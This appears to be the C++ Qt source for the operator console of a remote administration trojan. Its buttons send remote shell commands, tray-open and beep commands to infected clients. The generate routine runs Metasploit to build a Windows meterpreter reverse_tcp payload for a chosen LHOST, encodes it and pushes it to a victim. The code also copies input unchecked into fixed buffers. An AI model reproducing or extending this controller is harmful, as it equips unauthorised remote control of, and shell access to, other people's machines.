#include "qttest.h"
#include <QtWidgets/QApplication>
#ifndef __Header_H_DEFINED__
#define __Header_H_DEFINED__
#endif
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <conio.h>
#include <string>

int msend(char msendbuf[1024]);
int msend(LPVOID pointerToObject, char msendbuf[1024]);
char* mrecv(bool show);
int change_client(int client);
int mexit();
std::string readTextFromFile(char* filename);
std::string enc(std::string data);

extern int currentclient;
extern int verbose;
extern SOCKET ClientSocket;

QTTEST::QTTEST(QWidget *parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);
}

void QTTEST::on_sendButton_clicked() {

    std::string current_locale_text = (ui.sendEdit->text()).toLocal8Bit().constData();
    char *cstr = new char[current_locale_text.length() + 1];
    strcpy(cstr, current_locale_text.c_str());
    char sends[1024]="Server> ";
    strcat(sends,cstr);
    msend(this, sends);
    ui.textBrowser->append(sends); //Changes the text on the Text-label
    ui.sendEdit->setText("");

}

void QTTEST::on_sendEdit_returnPressed() {

    std::string current_locale_text = (ui.sendEdit->text()).toLocal8Bit().constData();
    char *cstr = new char[current_locale_text.length() + 1];
    strcpy(cstr, current_locale_text.c_str());
    char sends[1024]="Server> ";
    strcat(sends,cstr);
    msend(this, sends);
    ui.textBrowser->append(sends); //Changes the text on the Text-label
    ui.sendEdit->setText("");

}

void QTTEST::on_open_trayButton_clicked() {

    msend("Server> /open_tray");

}

void QTTEST::on_cmdEdit_returnPressed() {

    char sends[1024]="Server> /cmd ";
    std::string cmd_text = (ui.cmdEdit->text()).toLocal8Bit().constData();
    char *cstr = new char[cmd_text.length() + 1];
    strcpy(cstr, cmd_text.c_str());
    strcat(sends, cstr);
    msend(sends);
    ui.cmdEdit->setText("");
}

void QTTEST::on_cmdButton_clicked() {

    char sends[1024]="Server> /cmd ";
    std::string cmd_text = (ui.cmdEdit->text()).toLocal8Bit().constData();
    char *cstr = new char[cmd_text.length() + 1];
    strcpy(cstr, cmd_text.c_str());
    strcat(sends, cstr);
    msend(sends);
}

void QTTEST::on_beepButton_clicked() {

    char sends[1024]="Server> /beep ";
    std::string pitch_text = (ui.pitchEdit->text()).toLocal8Bit().constData();
    char *cstr = new char[pitch_text.length() + 1];
    strcpy(cstr, pitch_text.c_str());
    std::string length_text = (ui.lengthEdit->text()).toLocal8Bit().constData();
    char *cstr2 = new char[length_text.length() + 1];
    strcpy(cstr2, length_text.c_str());
    strcat(sends, cstr);
    strcat(sends, " ");
    strcat(sends, cstr2);
    msend(sends);
}

void QTTEST::on_listWidget_itemSelectionChanged() {

	std::string e = ui.listWidget->item((ui.listWidget->currentIndex().row()))->text().toStdString();
    char tab2[1024];
    strcpy(tab2, e.c_str());
	if (verbose == 1)
	{
		std::cout<<"CHANGED CLIENT TO: "<<tab2[0]<<"\n";
	}
    change_client(atoi(&tab2[0]));

}

void QTTEST::on_generateButton_clicked()
{
    std::string generate_text = (ui.generateEdit->text()).toLocal8Bit().constData();
    char *cstr = new char[generate_text.length() + 1];
    strcpy(cstr, generate_text.c_str());
	char part1[280] = "ruby c:/metasploit/apps/pro/msf3/msfpayload windows/meterpreter/reverse_tcp LHOST=";
	char part2[] = " LPORT=4444 R | ruby c:/metasploit/apps/pro/msf3/msfencode -a x86 -e x86/alpha_mixed BufferRegister=EAX -t raw -o pay.txt";
	strcat(part1, cstr);
	strcat(part1, part2);
	std::cout<<part1<<"\n";
	system(part1);
	std::string unenc = readTextFromFile("pay.txt");
	std::string encd = enc(unenc);
	char arg[700] = "/custom_meterpreter ";
	strcat(arg, encd.c_str());
	ui.sendEdit->setText(arg);
}

void QTTEST::on_generateEdit_returnPressed()
{

}

QTTEST::~QTTEST()
{

}